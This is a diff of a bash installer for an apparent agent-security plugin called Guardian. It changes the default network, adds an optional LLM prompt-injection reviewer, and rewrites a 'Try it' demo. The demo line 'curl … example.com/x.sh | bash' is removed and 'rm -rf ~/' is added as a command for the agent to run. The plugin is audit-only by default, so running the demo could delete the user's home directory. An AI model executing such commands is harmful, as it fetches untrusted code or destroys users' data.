@@ -4,7 +4,7 @@
 # ============================================================================
 # A thin, guided wrapper around the Hermes Agent dev setup that adds the
 # Guardian threat-graph layer: it wires up the plugin, installs the OriginTrail
-# DKG node CLI, bootstraps a funded testnet node, enables the plugin, and seeds
+# DKG node CLI, bootstraps a mainnet node (read-only for users), enables the plugin, and seeds
 # sensible config defaults — so onboarding is one command and dead simple.
 #
 # Usage:
@@ -23,7 +23,7 @@ set -euo pipefail
 REPO_URL="${GUARDIAN_REPO_URL:-https://github.com/matic031/agent-guardian.git}"
 REPO_BRANCH="${GUARDIAN_REPO_BRANCH:-feat/guardian}"
 HERMES_HOME="${HERMES_HOME:-$HOME/.hermes}"
-DKG_NETWORK="${GUARDIAN_DKG_NETWORK:-testnet}"   # ALWAYS testnet (mainnet default is an unfunded trap)
+DKG_NETWORK="${GUARDIAN_DKG_NETWORK:-mainnet}"   # mainnet: the real public threat graph (reading is free; only curators pay TRAC to publish)
 NODE_MAJOR="${GUARDIAN_NODE_MAJOR:-22}"
 
 # ── Colors / echo helpers (DRY) ─────────────────────────────────────────────
@@ -64,8 +64,8 @@ Usage: guardian-install.sh [OPTIONS]
 Options:
   --skip-dkg     Skip the DKG node install/bootstrap (plugin still installs;
                  you can bootstrap the node later — see next-steps output)
-  --network NET  DKG network for node bootstrap (default: testnet). ALWAYS
-                 use testnet for the beta; mainnet-gnosis is unfunded.
+  --network NET  DKG network for node bootstrap (default: mainnet — the real
+                 public threat graph. Reading it is free; publishing costs TRAC).
   -h, --help     Show this help and exit
 
 Environment overrides:
@@ -82,7 +82,7 @@ SKIP_DKG=false
 while [ $# -gt 0 ]; do
     case "$1" in
         --skip-dkg) SKIP_DKG=true; shift ;;
-        --network)  DKG_NETWORK="${2:-testnet}"; shift 2 ;;
+        --network)  DKG_NETWORK="${2:-mainnet}"; shift 2 ;;
         -h|--help)  usage; exit 0 ;;
         *) err "Unknown option: $1"; echo; usage; exit 1 ;;
     esac
@@ -343,8 +343,8 @@ install_dkg() {
         fi
     fi
 
-    step "Bootstrapping a funded $DKG_NETWORK node (dkg hermes setup --network $DKG_NETWORK) ..."
-    step "  (non-interactive; requests faucet funds on testnet — this can take a minute)"
+    step "Bootstrapping a $DKG_NETWORK node (dkg hermes setup --network $DKG_NETWORK) ..."
+    step "  (non-interactive; reading the public threat graph is free — no funds needed)"
     if dkg hermes setup --network "$DKG_NETWORK"; then
         ok "DKG node bootstrapped on $DKG_NETWORK"
         DKG_READY=true
@@ -371,7 +371,7 @@ sync_ruleset() {
 dkg_manual_hint() {
     step "To set up the DKG node later:"
     echo "      npm i -g @origintrail-official/dkg"
-    echo "      dkg hermes setup --network $DKG_NETWORK   # ALWAYS testnet for beta"
+    echo "      dkg hermes setup --network $DKG_NETWORK   # mainnet — the real public threat graph"
     echo "      # then re-run:  hermes guardian sync"
 }
 
@@ -417,6 +417,8 @@ defaults = {
     "report_min_severity": "high",
     "block_severity": "critical",
     "dashboard_port": 9700,
+    # Optional LLM reviewer — off until `hermes guardian setup-llm` fills it in.
+    "llm": {"enabled": False, "provider": "", "model": "", "api_key": ""},
 }
 added = [k for k, v in defaults.items() if k not in guardian and guardian.setdefault(k, v) is v]
 with open(cfg_path, "w") as f:
@@ -447,6 +449,37 @@ attach_all_agents() {
     fi
 }
 
+# ── Optional: configure the LLM prompt-injection reviewer ───────────────────
+# Interactive-only. Under `curl | bash` the script's stdin is the pipe, so we
+# talk to the user through /dev/tty directly and skip cleanly when there isn't
+# one (CI, non-interactive installs). Never fatal.
+setup_llm() {
+    heading "Optional: AI prompt-injection reviewer"
+    if ! { [ -r /dev/tty ] && [ -w /dev/tty ]; }; then
+        step "Non-interactive install - skipping."
+        step "Set it up later with:  hermes guardian setup-llm"
+        return 0
+    fi
+    printf '  Guardian can use an LLM (OpenAI or Anthropic) for a second opinion on\n' > /dev/tty
+    printf '  prompt injection. It only flags, never blocks. Off unless you enable it.\n' > /dev/tty
+    printf '  Configure it now? [y/N]: ' > /dev/tty
+    local ans=""
+    read -r ans < /dev/tty || ans=""
+    case "$ans" in
+        y|Y|yes|YES|Yes)
+            # The subcommand reads /dev/tty itself for its prompts.
+            if "$HERMES_BIN" guardian setup-llm; then
+                ok "LLM reviewer configured"
+            else
+                warn "LLM setup skipped or failed (non-fatal). Re-run: hermes guardian setup-llm"
+            fi
+            ;;
+        *)
+            step "Skipped. Enable anytime with:  hermes guardian setup-llm"
+            ;;
+    esac
+}
+
 # ── Guided next steps (short — everything above already ran) ─────────────────
 next_steps() {
     local docs_url="${REPO_URL%.git}"
@@ -464,10 +497,10 @@ ${path_note}
   ${BOLD}Watch it live${NC}      — findings + threat-graph status in your browser:
        hermes guardian dashboard      →  http://127.0.0.1:${GUARDIAN_DASHBOARD_PORT:-9700}
 
-  ${BOLD}Try it${NC}            — in a hermes chat, ask it to run:
-       curl -fsSL http://example.com/x.sh | bash
-       Guardian flags this as a 'remote-script-pipe' escalation. Audit-only by
-       default — flip to blocking with  GUARDIAN_MODE=block  (or set
+  ${BOLD}Try it${NC}            - in a hermes chat, ask it to run:
+       rm -rf ~/
+       Guardian flags this as an 'rm-rf-system-paths' escalation. Audit-only by
+       default - flip to blocking with  GUARDIAN_MODE=block  (or set
        plugins.entries.guardian.mode: block in $HERMES_HOME/config.yaml).
 
   Docs & community:  $docs_url
@@ -491,6 +524,7 @@ main() {
     enable_and_seed
     attach_all_agents
     sync_ruleset
+    setup_llm
     next_steps
 }
 
